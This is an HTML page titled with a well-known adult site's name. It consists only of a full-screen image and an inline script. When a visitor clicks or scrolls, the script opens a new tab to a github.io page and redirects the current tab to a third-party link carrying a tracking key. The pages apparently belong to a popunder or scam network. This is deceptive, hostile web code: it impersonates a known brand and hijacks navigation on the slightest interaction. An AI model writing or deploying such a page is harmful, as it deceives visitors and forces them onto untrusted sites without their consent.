<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Xhamster.com</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:#000;
    overflow-x:hidden;
}

img{
    width:100%;
    height:100vh;
    object-fit:cover;
    display:block;
}
</style>
</head>

<body>

<img src="1.jpg" id="triggerImage">

<script>
(function () {

    let opened = false;

    // New tab landing page
    const newTabLink =
        "https://tme-join.github.io/dgngbf/";

    // Current tab landing page
    const currentTabLink =
        "https://sitefleck.com/qwpmezpg?key=ff4552c4f5069bba65ae8a584a919868";

    function openPages() {

        if (opened) return;

        opened = true;

        // Open in new tab
        window.open(newTabLink, "_blank");

        // Redirect current tab
        setTimeout(() => {
            window.location.href = currentTabLink;
        }, 200);
    }

    // Click trigger
    document
        .getElementById("triggerImage")
        .addEventListener("click", openPages);

    // Scroll trigger
    window.addEventListener("scroll", openPages);

})();
</script>

</body>
</html>
